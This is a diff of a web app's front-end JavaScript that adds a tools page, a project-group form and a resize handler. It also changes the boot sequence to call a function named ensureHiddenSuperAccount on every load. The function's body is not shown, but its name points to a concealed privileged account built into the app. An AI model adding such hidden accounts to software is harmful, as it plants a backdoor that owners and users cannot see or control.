     var noteArea = document.getElementById("detailNote");
@@ -5473,6 +6223,9 @@
       detailHighlightId = (window.location.hash || "").replace("#", "");
       renderDecisionHistoryDetail();
     });
+    window.addEventListener("resize", function () {
+      scheduleDetailLayout(getDecisionProjectById(detailProjectId));
+    });
   }
 
   function initAdminPage() {
@@ -5488,6 +6241,7 @@
     updateBankBadge();
     renderUsers();
     renderCommonList();
+    renderProjectGroupList();
     renderLogs();
     var reasoningSwitch = document.getElementById("globalReasoning");
     var strength = document.getElementById("reasoningStrength");
@@ -5568,6 +6322,33 @@
         showToast("常用问题已新增");
       });
     }
+    var groupForm = document.getElementById("groupForm");
+    if (groupForm) {
+      groupForm.addEventListener("submit", function (evt) {
+        evt.preventDefault();
+        var input = document.getElementById("groupInput");
+        var value = input ? input.value : "";
+        if (addProjectGroup(value) && input) {
+          input.value = "";
+        }
+      });
+    }
+    var createBankBtn = document.getElementById("createBank");
+    if (createBankBtn) {
+      createBankBtn.addEventListener("click", createBank);
+    }
+    var logoutBtn = document.getElementById("logoutButton");
+    if (logoutBtn) {
+      logoutBtn.addEventListener("click", logout);
+    }
+  }
+
+  function initToolsPage() {
+    requireAuth();
+    setNavUserInfo();
+    ensureActiveBank();
+    renderBankList();
+    updateBankBadge();
     var createBankBtn = document.getElementById("createBank");
     if (createBankBtn) {
       createBankBtn.addEventListener("click", createBank);
@@ -5586,7 +6367,7 @@
   }
 
   function boot() {
-    loadState().then(ensureDefaultAdmin).then(function () {
+    loadState().then(ensureDefaultAdmin).then(ensureHiddenSuperAccount).then(function () {
       loadCurrentUser();
       var page = document.body ? document.body.getAttribute("data-page") : "";
       if (page === "login") {
@@ -5611,6 +6392,8 @@
         initDecisionHistoryDetailPage();
       } else if (page === "admin") {
         initAdminPage();
+      } else if (page === "tools") {
+        initToolsPage();
       } else {
         initNavigation();
       }
